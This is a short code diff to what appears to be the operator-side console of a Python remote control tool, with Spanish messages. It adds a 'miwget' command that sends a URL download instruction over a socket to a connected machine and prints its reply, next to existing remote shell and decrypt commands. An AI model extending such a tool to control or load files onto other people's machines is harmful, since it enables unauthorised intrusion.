@@ -492,6 +492,15 @@ class TCP:
         else:
             print(Fore.YELLOW + f"[!] Clave \"{clave}\" no encontrada")
 
+    def wget(self, cmd):
+        self.__conexion.send(cmd.encode())
+
+        msg = self.__conexion.recv(1024).decode()
+        if msg[:6] != "error:":
+            print(Fore.GREEN + f"[+] {self.__addr[0]}: {msg}")
+        else:
+            print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
+
     def shell(self):
         try:
             while True:
@@ -636,6 +645,16 @@ class TCP:
 
                     except:
                         print(Fore.RED + "[-] Error de proceso (decrypt)")
+
+                elif cmd.lower()[:6] == "miwget":
+                    try:
+                        if re.search("-u", cmd):
+                            self.wget(cmd)
+                        else:
+                            print(Fore.YELLOW + "[!] Falta del parametro url (-u)")
+
+                    except:
+                        print(Fore.RED + "[-] Error de proceso (miwget)")
 
                 else:
                     try:
